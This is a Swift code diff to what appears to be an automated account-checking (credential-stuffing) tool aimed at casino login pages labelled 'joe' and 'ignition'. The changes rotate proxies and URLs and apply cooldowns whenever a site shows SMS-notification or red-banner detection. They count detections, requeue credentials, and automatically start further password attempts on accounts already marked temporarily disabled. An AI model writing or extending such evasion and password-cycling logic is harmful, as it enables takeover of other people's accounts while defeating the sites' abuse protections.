@@ -517,7 +517,7 @@ class LoginViewModel {
                 log("Skipped perm disabled: \(cred.username)", level: .warning)
                 continue
             }
-            if blacklistService.autoExcludeBlacklist && blacklistService.isBlacklisted(cred.username) {
+            if blacklistService.isBlacklisted(cred.username) {
                 skippedBlacklist += 1
                 continue
             }
@@ -580,6 +580,13 @@ class LoginViewModel {
             return
         }
 
+        if blacklistService.isBlacklisted(cred.username) {
+            cred.status = .permDisabled
+            log("\(cred.username) — BLOCKED: blacklisted, skipping test", level: .warning)
+            persistCredentials()
+            return
+        }
+
         cred.status = .testing
         let attempt = LoginAttempt(credential: cred, sessionIndex: activeTestCount + 1)
         attempts.insert(attempt, at: 0)
@@ -601,9 +608,11 @@ class LoginViewModel {
         engine.debugMode = debugMode
         engine.stealthEnabled = stealthEnabled
         engine.automationSettings = automationSettings
+        engine.proxyTarget = .joe
         secondaryEngine.debugMode = debugMode
         secondaryEngine.stealthEnabled = stealthEnabled
         secondaryEngine.automationSettings = automationSettings
+        secondaryEngine.proxyTarget = .ignition
     }
 
     private func handleOutcome(_ outcome: LoginOutcome, credential: LoginCredential, attempt: LoginAttempt) {
@@ -652,24 +661,39 @@ class LoginViewModel {
         case .redBannerError:
             credential.status = .untested
             let redEntry = RequeuePriorityService.shared.prioritize(credentialId: credential.id, username: credential.username, outcome: outcome)
+            let redDetCount = RequeuePriorityService.shared.detectionCount(for: credential.id)
+            let _ = proxyService.nextWorkingProxy(for: isIgnitionMode ? .ignition : .joe)
+            if let detURL = attempt.detectedURL, !detURL.isEmpty {
+                urlRotation.reportFailure(urlString: detURL)
+            }
             if let entry = redEntry {
                 requeueCredentialWithPriority(credential, entry: entry)
             } else {
                 requeueCredentialToBottom(credential)
             }
-            log("\(credential.username) — red banner error detected, requeued", level: .warning)
+            let cooldown = Int(RequeuePriorityService.shared.cooldownForOutcome(outcome))
+            log("\(credential.username) — red banner error (\(redDetCount)x) — proxy+URL rotated, \(cooldown)s cooldown", level: .warning)
 
         case .smsDetected:
             credential.status = .untested
             let smsEntry = RequeuePriorityService.shared.prioritize(credentialId: credential.id, username: credential.username, outcome: outcome)
+            let smsDetCount = RequeuePriorityService.shared.detectionCount(for: credential.id)
+            let _ = proxyService.nextWorkingProxy(for: isIgnitionMode ? .ignition : .joe)
+            if let detURL = attempt.detectedURL, !detURL.isEmpty {
+                urlRotation.reportFailure(urlString: detURL)
+            }
             if let entry = smsEntry {
                 requeueCredentialWithPriority(credential, entry: entry)
             } else {
                 requeueCredentialToBottom(credential)
             }
-            log("\(credential.username) — SMS notification detected (Ignition) — burning session, requeued for retry with different IP/webview", level: .warning)
+            let cooldown = Int(RequeuePriorityService.shared.cooldownForOutcome(outcome))
+            log("\(credential.username) — SMS notification (\(smsDetCount)x) — session burned, proxy+URL rotated, \(cooldown)s cooldown", level: .warning)
 
         case .unsure, .timeout, .connectionFailure:
+            if outcome == .unsure {
+                credential.recordFullLoginAttempt()
+            }
             credential.status = .untested
             if outcome == .connectionFailure {
                 consecutiveConnectionFailures += 1
@@ -679,7 +703,7 @@ class LoginViewModel {
             switch outcome {
             case .timeout: reason = "timeout (\(Int(testTimeout))s combined)"
             case .connectionFailure: reason = "connection failure"
-            default: reason = "unsure result"
+            default: reason = "unsure result (attempt \(credential.fullLoginAttemptCount))"
             }
             if let entry {
                 requeueCredentialWithPriority(credential, entry: entry)
@@ -956,6 +980,8 @@ class LoginViewModel {
         showBatchResultPopup = true
         notifications.sendBatchComplete(working: working, dead: dead, requeued: requeued)
         persistCredentials()
+
+        autoTriggerTempDisabledPasswordCheck()
     }
 
     private func resetStuckTestingCredentials() {
@@ -1195,6 +1221,17 @@ class LoginViewModel {
             debugScreenshots.removeLast(debugScreenshots.count - keep)
             log("Memory pressure: flushed \(before - keep) screenshots to disk cache", level: .warning)
         }
+    }
+
+    private func autoTriggerTempDisabledPasswordCheck() {
+        let tempWithPasswords = credentials.filter {
+            $0.status == .tempDisabled && !$0.assignedPasswords.isEmpty && $0.nextPasswordIndex < $0.assignedPasswords.count
+        }
+        guard !tempWithPasswords.isEmpty else { return }
+        let totalUntested = tempWithPasswords.reduce(0) { $0 + $1.untestedPasswordCount }
+        log("AUTO-TRIGGER: \(tempWithPasswords.count) temp disabled account(s) with \(totalUntested) untested password(s) — starting password check", level: .success)
+        logger.log("Auto-triggering temp disabled password check: \(tempWithPasswords.count) accounts, \(totalUntested) passwords", category: .login, level: .info)
+        runTempDisabledPasswordCheck()
     }
 
     func runTempDisabledPasswordCheck() {
